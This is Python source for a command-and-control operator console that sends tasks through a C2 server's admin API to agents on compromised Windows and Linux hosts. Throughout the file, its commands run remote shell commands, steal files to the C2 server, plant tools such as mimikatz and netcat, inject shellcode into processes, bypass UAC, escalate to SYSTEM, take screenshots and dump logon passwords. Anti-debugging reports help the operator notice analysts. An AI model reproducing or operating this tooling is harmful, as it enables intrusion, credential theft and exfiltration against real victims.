import base64
import json
import sys
import requests
from pathlib import Path
from pprint import pprint
import toml
import time
import cmd

mysettings_server = ''

try:
    data = toml.load("config.toml")
    mysettings_server = data['settings']['server']
except:
    print("")

menu = 1
prompt = "> "
current_agent = ""

# Define an enumeration subclass Enum
from enum import Enum

class errorcode(Enum):
    success = 0
    warning = 1
    invalid = 2

class taskstatus(Enum):
    Queued = 1
    Pending = 2
    Executing = 3
    Complete = 4
    Failed = 5
    NotSupported = 6

class tasktype(Enum):
    Terminate = 1
    Command = 2
    Pwd = 3
    ChangeDir = 4
    Whoami = 5
    PsList = 6
    Download = 7
    Upload = 8
    ListPrivs = 9
    SetPriv = 10
    RemoteInject = 11
    BypassUAC = 12
    Getsystem = 13
    Screenshot = 14
    Jitter = 15
    Mimikatz = 16

base_commands = {
    "help       " : "print this info",
    "agents     " : "agents information",
    "alias       ": "create command alias",
    "load_aliases": "load aliases from file",
    "quit       " : "exit from the console"
}

agents_commands = {
    "list       " : "list all agents",
    "dropdb     " : "delete all data from the db",
    "alias       ": "create command alias",
    "load_aliases": "load aliases from file",
    "debugreports": "show debugging detection reports for all agents",
    "use        " : "connect to a specific agent",
    "help       " : "print this info",
    "back       " : "go back to the main menu",
    "quit       "  : "same as back"
}

agent_interactive_commands = {
    "task" : "specific task details",
    "history" : "task history",
    "sysinfo" : "basic agent details",
    "shell" : "execute os command",
    "ps": "print list of running processes",
    "debugreports": "show debugging detection reports for this agent",
    "pwd" : "print current working directory",
    "cd" : "change directory",
    "upload": "upload a file to the Server. ex: upload /tmp/test.txt C:\\test.txt",
    "download": "download a file. ex download C:\\LargeFiles\\100MB.zip",
    "listprivs": "listprivs",
    "setpriv": "enable or disable a priv. ex: setpriv SeDebug enabled",
    "scinject": "remote shellcode injection. ex: scinject [path/shellcode] [pid]",
    "getuid": "get user info",
    "help" : "print this info",
    "back" : "go back to the agents menu",
    "terminate": "kill agent",
    "resource": "run a cmds from a file. RC file local to the CLI. one cmd per line. ex: resource [cmds.rc]",
    "bypassuac": "spawn a High integrity cmd.exe using UAC bypass",
    "getsystem": "spawn a SYSTEM cmd using getsystem",
    "screenshot": "gets a screenshot of the users Desktop",
    "sleep": "sleep <seconds> <jitter-max> (jitter-min)",
    "alias": "create command alias",
    "load_aliases": "load aliases from file",
    "mimikatz"   : "run mimikatz sRDI module: mimikatz \"<module>::<command>;...\"",
    "logonpasswords": "alias for mimikatz sekurlsa::logonpasswords",
    "quit" : "same as back"
}

def save_aliases_to_file(alias_file, aliases):
    try:
        with open(alias_file, 'w') as f:
            for name, cmd_str in aliases.items():
                f.write(f"{name}={cmd_str}\n")
    except Exception as e:
        print(f"Failed to save aliases: {e}")

def print_task_type(task_type):
    match task_type:
        case tasktype.Terminate.value:
            print("Terminate")
        case tasktype.Command.value:
            print("Command")
        case tasktype.Pwd.value:
            print("Pwd")
        case tasktype.ChangeDir.value:
            print("ChangeDir")
        case tasktype.Whoami.value:
            print("Whoami")
        case tasktype.PsList.value:
            print("PsList")
        case tasktype.Upload.value:
            print("Download")
        case tasktype.Download.value:
            print("Upload")
        case tasktype.ListPrivs.value:
            print("ListPrivs")
        case tasktype.SetPriv.value:
            print("SetPrivs")
        case tasktype.RemoteInject.value:
            print("RemoteInject")
        case _:
            print("Unknown")

def api_debug_reports():
    global mysettings_server
    url = f"http://{mysettings_server}/admin/api/debug_reports"
    r = requests.get(url, timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_agent_debug_reports(agent_id):
    global mysettings_server
    url = f"http://{mysettings_server}/admin/api/debug_reports/{agent_id}"
    r = requests.get(url, timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None
        
def api_task_details(task_id):
    global mysettings_server
    url = "http://{}/admin/api/task/{}".format(mysettings_server,task_id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_task_history(id):
    global mysettings_server
    url = "http://{}/admin/api/agent_task/{}".format(mysettings_server,id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_get_agent(id):
    global mysettings_server
    url = "http://{}/admin/api/agent/{}".format(mysettings_server,id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None
            
def api_agents():
    global mysettings_server
    url = "http://{}/admin/api/agents".format(mysettings_server)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_dropdb():
    global mysettings_server
    url = "http://{}/admin/api/dropdb".format(mysettings_server)
    r = requests.get(url,timeout=300)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_send_task(task, timeout=60):
    global mysettings_server
    url = "http://{}/admin/api/task".format(mysettings_server)
    r = requests.post(url, json=task, timeout=timeout)
    
    if r.status_code != 200:
        print(f"[ERROR] HTTP POST failed with status {r.status_code}")
        return None

    response_json = r.json()
    print(response_json)  # Should include 'task_id'
    
    if 'task_id' in response_json:
        task_id = response_json['task_id']
        print(f"Task ID: {task_id}")
        
        # Poll for the result instead of sleeping a fixed time
        max_wait_time = 15  # maximum wait time in seconds
        poll_interval = 1   # seconds between polls
        start_time = time.time()
        task_details = None
        
        while time.time() - start_time < max_wait_time:
            task_details = api_task_details(task_id)
            if task_details and 'result' in task_details and task_details['result']:
                break
           # print("[INFO] Task result not available yet... retrying.")
            time.sleep(poll_interval)
        
        if task_details and 'result' in task_details and task_details['result']:
            print_task_details(task_details)
            #try:
                #output = base64.b64decode(task_details['result']).decode('utf-8')
                #print(f"Decoded Output: {output}")  # Should show the working directory
            #except Exception as e:
                #print(f"[ERROR] Decoding task result failed: {e}")
        else:
            print("[ERROR] Task result could not be retrieved within the timeout!")
    else:
        print("[ERROR] No task_id found in server response!")
    
    return response_json


def print_agents(agents):
    print("--------------------------------------------------")
    if agents == None:
        print("Cant connect to server")
    elif len(agents) == 0:
        print("\t\tNo agents")
    else:
        for agent in agents:
            print_agent_details(agent)
            if len(agents) > 1:    
                print("-------")
    print("--------------------------------------------------")
    
def print_debug_reports(reports):
    if reports is None:
        print("Could not connect to server.")
        return
    if len(reports) == 0:
        print("\nNo debug reports found.\n")
        return
        
    print("\n--- Debug Detection Reports ---")
    print(f"{'ID':<5} {'Agent ID':<10} {'Debugging':<10} {'Timestamp':<25}")
    print("-" * 55)
    
    for report in reports:
        debug_status = "⚠️ DETECTED" if report["debug_detected"] else "None"
        print(f"{report['id']:<5} {report['agent_id']:<10} {debug_status:<10} {report['timestamp']}")
    
    print("-" * 55)
    print("")

def print_task_details(task):
    if task == None:
        print("Cant connect to server")
    else:
        print("")
        print("ID\t\t:",task['id'])
        print("Type\t\t: ",end="")
        print_task_type(task['type'])
        print("Created\t\t:",task['created'])
        print("Updated\t\t:",task['updated'])
        print("Input\t\t:",task['input'][:512])
        if task['status'] == 1:
            print("Status\t\t: Queued")
        elif task['status'] == 2:
            print("Status\t\t: Pending")
        elif task['status'] == 3:
            print("Status\t\t: Executing")
        elif task['status'] == 4:
            print("Status\t\t: Complete")
            output = base64.b64decode(task['result']).decode('utf-8')
            if len(output) > 1024:
                print("Result\t\t:\n",output[:32768])
            else:
                print("Result\t\t:\n",output)
        elif task['status'] == 5:
            print("Status\t\t: Failed")
            output = base64.b64decode(task['result']).decode('utf-8')
            if len(output) > 1024:
                print("Result\t\t:\n",output[:16384])
            else:
                print("Result\t\t:\n",output)
        elif task['status'] == 6:
            print("Status\t\t: Not Supported")

def print_task_history(task_history):
    print("--------------------------------------------------")
    if task_history == None:
        print("Cant connect to server")
    elif len(task_history) == 0:
        print("\t\tNo tasks")
    else:
        for task in task_history:
            print("---")
            print("ID\t\t:",task['id'])
            print("Type\t\t: ",end="")
            print_task_type(task['type'])
            print("Input\t\t:",task['input'][:75])
            if task['status'] == 1:
                print("Status\t\t: Queued")
            elif task['status'] == 2:
                print("Status\t\t: Pending")
            elif task['status'] == 3:
                print("Status\t\t: Executing")
            elif task['status'] == 4:
                print("Status\t\t: Completed")
            elif task['status'] == 5:
                print("Status\t\t: Failed")
            elif task['status'] == 6:
                print("Status\t\t: Not Supported")
            print("Created\t\t:",task['created'])
            print("Updated\t\t:",task['updated'])
    print("--------------------------------------------------")

## agent is a json object
def print_agent_details(agent):
    if agent == None:
        print("Cant connect to server")
    else:
        print("ID\t\t:",agent['id'])
        print("Machine GUID\t:",agent['machine_guid'])
        print("Username\t:",agent['username'])
        print("Hostname\t:",agent['hostname'])
        print("Integrity\t:",agent['integrity'])
        print("Process Arch\t:",agent['process_arch'])
        print("Internal IP\t:",agent['internal_ip'])
        print("External IP\t:",agent['external_ip'])
        print("First Checkin\t:",agent['created'])
        print("Updated\t\t:",agent['updated'])
        print("-------")
        
def agent_send_bypassuac_cmd(args):
    tokens = args.split()
    if len(tokens) < 2:
        print("Usage: bypassuac [method] [cmd w/ args]")
        return
    method = tokens[0]
    if method != "1":
        print("Error: Only method 1 (fodhelper) is supported for bypassuac.")
        return
    # Combine the rest into a command string
    cmd_args = " ".join(tokens[1:])
    # Build the task input string: include the method and then the command
    input_str = method + " " + cmd_args
    # Send the task with type BypassUAC (12)
    agent_send_cmd(tasktype.BypassUAC.value, input_str)
    
def help_debugreports(self, arg):
    """Provides detailed help for the debugreports command."""
    print("")
    print("Command: debugreports")
    print("--------------------")
    print("Description: Shows anti-debugging detection reports from agents.")
    print("             Helps identify if agents are being analyzed or debugged.")
    print("")
    print("Usage:")
    print("  debugreports            - Show reports for the current agent (in agent context)")
    print("  agents > debugreports   - Show reports for all agents (in agents menu)")
    print("")
    print("What's reported:")
    print("  - Detection timestamp")
    print("  - Whether a debugger was detected")
    print("  - Agent ID")
    print("")
    print("Anti-debugging techniques used:")
    print("  - PEB BeingDebugged flag check")
    print("  - Windows API IsDebuggerPresent()")
    print("  - Debug port check via NtQueryInformationProcess")
    print("  - Timing analysis for debugger overhead")
    print("")
    
def help_download(self, arg):
    """Provides detailed help for the download command."""
    print("")
    print("Command: download")
    print("-----------------")
    print("Description: Downloads a file from the compromised host to the C2 server.")
    print("             The file is retrieved from the target system and stored on the C2 server.")
    print("")
    print("Usage: download <remote_file_path>")
    print("")
    print("Parameters:")
    print("  remote_file_path - Full path to the file on the target system to download")
    print("")
    print("Examples:")
    print("  download C:\\Windows\\System32\\drivers\\etc\\hosts")
    print("  download C:\\Users\\Administrator\\Desktop\\secrets.txt")
    print("  download /etc/passwd          # On Linux targets")
    print("")
    print("Notes:")
    print("- Downloaded files are stored in the server's data/<agent_id>/upload directory")
    print("- Large files may take time to transfer depending on connection speed")
    print("- The remote path must be accessible to the agent process")
    print("")

    
def agent_send_getsystem_cmd(args):

    tokens = args.split()
    if len(tokens) < 2:
        print("Usage: getsystem [method] [cmd w/ args]")
        return
    method = tokens[0]
    if method != "1":
        print("Error: Only method 1 (pipe) is supported for getsystem.")
        return
    # Combine remaining arguments into a command string
    cmd_args = " ".join(tokens[1:])
    input_str = method + " " + cmd_args
    # Send task with getsystem type (13)
    agent_send_cmd(tasktype.Getsystem.value, input_str)
    
def agent_send_screenshot_cmd():
    # Build and send a task of type 14 (screenshot)
    agent_send_cmd(14, "")

def agent_send_sleep_cmd(args):
    # 'args' will be the string containing sleep time and jitter percentages (e.g., "10 30" or "10 40 30")
    agent_send_cmd(15, args)

def agent_send_host_download_file_exec(type,path,input):
    json_data = {   'agent_id': current_agent, 
                    'path': path, 
                    'type': type,
                    'input_args':input
                    }
    pprint(json_data)
    global mysettings_server
    url = "http://{}/admin/api/host_download_file_exec".format(mysettings_server)
    r = requests.post(url,json=json_data,timeout=900)
    if r.status_code == 200:
        pprint(r.json())
        return r.json()
    else:
        print("failed request")
        return None

def agent_send_host_download_file(path,dst_path):
    json_data = {   'agent_id': current_agent, 
                    'path': path, 
                    'dst_path':dst_path
                    }
    pprint(json_data)
    global mysettings_server
    url = "http://{}/admin/api/host_download_file".format(mysettings_server)
    r = requests.post(url,json=json_data,timeout=900)
    if r.status_code == 200:
        pprint(r.json())
        return r.json()
    else:
        print("failed request")
        return None

def agent_send_cmd(type = 1, input = ''):
    json_data = {   'agent_id': current_agent, 
                    'input': input, 
                    'status': 1, 
                    'type': type
                }
    pprint(json_data)
    data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
    task = { 'data': data }
    result = api_send_task(task)
    pprint(result)

def agent_send_terminate_cmd():
    agent_send_cmd(tasktype.Terminate.value)

def agent_send_shell_cmd(shell_cmd):
    agent_send_cmd(tasktype.Command.value,shell_cmd)

def agent_send_pwd_cmd():
    agent_send_cmd(tasktype.Pwd.value)

def agent_send_cd_cmd(cd_dir):
    agent_send_cmd(tasktype.ChangeDir.value,cd_dir)

def agent_send_getuid_cmd():
    agent_send_cmd(tasktype.Whoami.value)

def agent_send_ps_cmd():
    agent_send_cmd(tasktype.PsList.value)

def agent_send_download_cmd(srv_path,dst_path):
    agent_send_host_download_file(srv_path,dst_path)
    
def agent_send_upload_cmd(uploadpath):
    agent_send_cmd(tasktype.Upload.value,uploadpath)

def agent_send_listprivs_cmd():
    agent_send_cmd(tasktype.ListPrivs.value)

def agent_send_setpriv_cmd(input):
    agent_send_cmd(tasktype.SetPriv.value,input)

def agent_task_details(task_id):
    task = api_task_details(task_id)
    print_task_details(task)

def agent_history():
    task_history = api_task_history(current_agent)
    print_task_history(task_history)
        
def agent_sysinfo():
    agent = api_get_agent(current_agent)
    if "id" in agent:
        print("ID\t\t:",agent['id'])
        print("Machine GUID\t:",agent['machine_guid'])
        print("Username\t:",agent['username'])
        print("Hostname\t:",agent['hostname'])
        if agent['integrity'] == 3:
            print("Integrity\t:",agent['integrity']," - Medium")
        elif agent['integrity'] == 4:
            print("Integrity\t:",agent['integrity']," - High")
        elif agent['integrity'] == 5:
            print("Integrity\t:",agent['integrity']," - SYSTEM")
        print("Process Arch\t:",agent['process_arch'])
        print("Internal IP\t:",agent['internal_ip'])
        print("External IP\t:",agent['external_ip'])
        print("First Checkin\t:",agent['created'])
        print("Updated\t\t:",agent['updated'])

def use_agent(inputstr):
    global current_agent
    global menu
    global prompt
    agent_json = api_get_agent(inputstr)
    if agent_json == None:
        print("Cant connect to server")
    elif "id" in agent_json:
        menu = 3
        current_agent = inputstr
        prompt = inputstr + " > "
        print_agent_details(agent_json)
    else:
        print("invalid agent_id")

def list_agents():
    agents = api_agents()
    print_agents(agents)

def set_agent_menu():
    global menu
    global prompt
    menu = 2
    prompt = "agents > "

def set_main_menu():
    global menu
    global prompt
    menu = 1
    prompt = "> "

def print_main_menu_help():
    for i in base_commands :
        print(i,"\t:", base_commands[i])

def print_agents_help():
    for i in agents_commands:
        print(i,"\t:", agents_commands[i])

def print_agent_interactive_help():
    for i in agent_interactive_commands:
        if(len(str(i)) >= 7):
            print(i,"\t:", agent_interactive_commands[i])
        else:
            print(i,"\t\t:", agent_interactive_commands[i])
            
def agent_send_mimikatz_cmd(args):
    """Wraps tasktype 16: run mimikatz sRDI module."""
    if not args.strip():
        print("Usage: mimikatz \"<module>::<command1>;<module>::<command2>;...\"")
        return
    agent_send_cmd(tasktype.Mimikatz.value, args)

#
# main menu 1
# agents 2
# interactive agent 3
#

def parseInput(inputstr):
    global menu, prompt, current_agent
    if inputstr == "quit" or inputstr == "back" or inputstr == "exit":
        if menu == 1:
            sys.exit(0)
        elif menu == 2:
            set_main_menu()
        elif menu == 3: 
            set_agent_menu()
        return 
    
    elif inputstr == "help":
        if menu == 1:
            print_main_menu_help()
            print("")
        elif menu == 2:
            print_agents_help()
            print("")
        elif menu == 3:
            print_agent_interactive_help()
            print("")   
        else:
            print("")
        return 
    
    elif inputstr == "agents":
        set_agent_menu()
        return 
    elif menu == 2:
        if inputstr == "list":
            list_agents()
            return
        if inputstr == "dropdb":
            api_dropdb()
            return
        elif inputstr.startswith("use "):
            agent_id = inputstr.replace('use ', '')
            use_agent(agent_id)
            return
        elif inputstr == "debugreports":
            reports = api_debug_reports()
            print_debug_reports(reports)
            return
        
    elif menu == 3:
        if inputstr == "sysinfo":
            agent_sysinfo()
            return
        elif inputstr == "terminate":
            agent_send_terminate_cmd()
            return
        elif inputstr.startswith("shell "):
            shell_cmd = inputstr.replace('shell ', '')
            agent_send_shell_cmd(shell_cmd)
            return
        elif inputstr == "pwd":
            agent_send_pwd_cmd()
            return
        elif inputstr == "debugreports":
            reports = api_agent_debug_reports(current_agent)
            print_debug_reports(reports)
            return
        elif inputstr == "getuid" or inputstr == "whoami":
            agent_send_getuid_cmd()
            return
        elif inputstr == "ps":
            agent_send_ps_cmd()
            return
        elif inputstr.startswith("cd "):
            cd_dir = inputstr.replace('cd ', '')
            agent_send_cd_cmd(cd_dir)
            return
        elif inputstr.startswith("bypassuac"):
            # Remove the command name and any leading spaces
            args = inputstr[len("bypassuac"):].strip()
            if not args:
                print("Usage: bypassuac [method] [cmd w/ args]")
                return
            else:
                agent_send_bypassuac_cmd(args)
                return
        elif inputstr.startswith("getsystem"):
            args = inputstr[len("getsystem"):].strip()
            if not args:
                print("Usage: getsystem [method] [cmd w/ args]")
                return
            else:
                agent_send_getsystem_cmd(args)
                return
        ##
        ## we flip the perspective here for upload and download
        ##
        elif inputstr.startswith("download "):
            upload_path = inputstr.replace('download ', '')
            agent_send_upload_cmd(upload_path)
            return
        elif inputstr.startswith("upload "):
            uploadfile_input = inputstr.replace('upload ', '')
            srv_path = uploadfile_input.split(" ")[0]
            dst_path = uploadfile_input.split(" ")[-1]
            agent_send_download_cmd(srv_path,dst_path) 
            return
        elif inputstr == "listprivs":
            agent_send_listprivs_cmd()
            return
        elif inputstr.startswith("setpriv "):
            setpriv_cmd = inputstr.replace('setpriv ', '')
            tokens = setpriv_cmd.split(" ")
            if len(tokens) != 2:
                print("Usage: setpriv <Privilege> <enabled|disabled>")
                return
            else:
                priv, state = tokens[0], tokens[1]
                if state not in ["enabled", "disabled"]:
                    print("Invalid state. State should be 'enabled' or 'disabled'.")
                    return
                else:
                    dll_path = "cli/modules/setpriv/setpriv_x64.dll"
                    input_args = priv + " " + state
                    agent_send_host_download_file_exec(tasktype.SetPriv.value, dll_path, input_args)
                    return
        elif inputstr == "screenshot":
            agent_send_screenshot_cmd()
            return
        elif inputstr.startswith("sleep"):
            args = inputstr.replace("sleep", "", 1).strip()
            if not args:
                print("Usage: sleep <seconds> <jitter-max> (jitter-min)")
                return
            else:
                agent_send_sleep_cmd(args)
                return
        elif inputstr.startswith("scinject "):
            scinject_cmd = inputstr.replace('scinject ', '')
            file = scinject_cmd.split(" ")[0]
            processOrpid = scinject_cmd.split(" ")[1]
            agent_send_host_download_file_exec(tasktype.RemoteInject.value,file,processOrpid)
            return
        elif inputstr.startswith("resource "):
            autoruncmds = []
            resource_cmd = inputstr.replace('resource ', '')
            file = resource_cmd.split(" ")[0]
            pathfile = Path(file)
            if pathfile.is_file():
                f=open(file,"r")
                for line in f:
                    cmd = line.strip()
                    if(len(cmd) > 0):
                        autoruncmds.append(cmd)
                f.close()
                for cmd in autoruncmds:
                    parseInput(cmd)
                return
        elif inputstr == "history" or inputstr == "tasks":
            agent_history()
            return
        elif inputstr.startswith("task "):
            task_id = inputstr.replace('task ', '')
            print(task_id)
            agent_task_details(task_id)
            return
        elif inputstr.startswith("mimikatz "):
            argstr = inputstr[len("mimikatz "):].strip()
            agent_send_mimikatz_cmd(argstr)
            return
        elif inputstr == "logonpasswords":
            # shorthand alias
            agent_send_mimikatz_cmd("sekurlsa::logonpasswords")
            return
'''
while True:
    try:
        inputstr = str(input(prompt))
        print("")
        parseInput(inputstr)
    except TypeError as err:
        print("error: {}".format(err))
    except KeyboardInterrupt as err:
        sys.exit()
    except EOFError as err:
        sys.exit()
'''


class C2CLI(cmd.Cmd):
    """Command-line interface for C2 operations with autocomplete and alias support."""
    intro = "Welcome to the C2 CLI. Type help or ? to list commands."
    prompt = "> "

    def __init__(self):
        super().__init__()
        # Alias mapping and file
        self.aliases = {}
        self.alias_file = "aliases.cfg"
        self.do_load_aliases(self.alias_file)
        # Sync prompt with global state
        self.prompt = prompt
        
        
    def do_help(self, arg):
        if arg == "download":
            self.help_download(None)
        elif arg == "upload":
            self.help_upload(None)
        elif arg == "debugreports":
            self.help_debugreports(None)
        else:
            # Call the original help function for general help
            parseInput('help')
    
    def help_upload(self, arg):
        """Provides detailed help for the upload command."""
        print("")
        print("Command: upload")
        print("---------------")
        print("Description: Uploads a file from the C2 server to the compromised host.")
        print("             The file is transferred from the server to the specified location on the target system.")
        print("")
        print("Usage: upload <local_file_path> <remote_destination_path>")
        print("")
        print("Parameters:")
        print("  local_file_path       - Path to the file on the C2 server to upload")
        print("  remote_destination_path - Full path where the file should be saved on the target system")
        print("")
        print("Examples:")
        print("  upload ./payloads/mimikatz.exe C:\\Windows\\Temp\\mk.exe")
        print("  upload ./tools/netcat.exe C:\\Users\\Public\\nc.exe")
        print("  upload ./scripts/recon.ps1 C:\\Scripts\\recon.ps1")
        print("")
        print("Notes:")
        print("- The destination directory must exist and be writable by the agent process")
        print("- The upload process may fail if the target path requires elevated permissions")
        print("- Local paths can be relative to the current directory of the CLI")
        print("")

    def do_alias(self, arg):
        """Create an alias: alias <name> <command>"""
        parts = arg.split(None, 1)
        if len(parts) != 2:
            print("Usage: alias <name> <command>")
            return
        name, command = parts
        self.aliases[name] = command
        save_aliases_to_file(self.alias_file, self.aliases)
        print(f"Alias '{name}' -> '{command}' created and saved.")

    def do_load_aliases(self, arg):
        """Load aliases from a file: load_aliases [file]"""
        filename = arg.strip() or self.alias_file
        try:
            with open(filename) as f:
                for line in f:
                    if line.strip() and not line.startswith('#') and '=' in line:
                        n,c = line.split('=',1)
                        self.aliases[n.strip()] = c.strip()
            print(f"Loaded aliases from {filename}.")
        except Exception as e:
            print(f"Failed to load aliases: {e}")

    def complete_load_aliases(self, text, line, begidx, endidx):
        return [p.name for p in Path('.').iterdir() if p.is_file() and p.name.startswith(text)]

    def default(self, line):
        """Handle commands, including aliases."""
        # Handle aliased commands
        parts = line.split()
        if parts and parts[0] in self.aliases:
            aliased = self.aliases[parts[0]]
            line = aliased + (' ' + ' '.join(parts[1:]) if len(parts)>1 else '')
        
        # Process the command
        parseInput(line)
        # update CLI prompt if changed by parseInput
        self.prompt = prompt
        return False

    def completenames(self, text, *ignored):
        cmds = [n[3:] for n in self.get_names() if n.startswith('do_')]
        return [c for c in cmds + list(self.aliases) if c.startswith(text)]

    def complete_use(self, text, line, begidx, endidx):
        agents = api_agents() or []
        ids = [str(a['id']) for a in agents]
        return [i for i in ids if i.startswith(text)]

    def do_EOF(self, arg):
        print("Exiting.")
        return True

    def do_exit(self, arg):
        print("Exiting.")
        return True
    
    def do_agents(self, arg):
        """agents: switch to agents menu"""
        parseInput('agents')

if __name__ == '__main__':
    C2CLI().cmdloop()

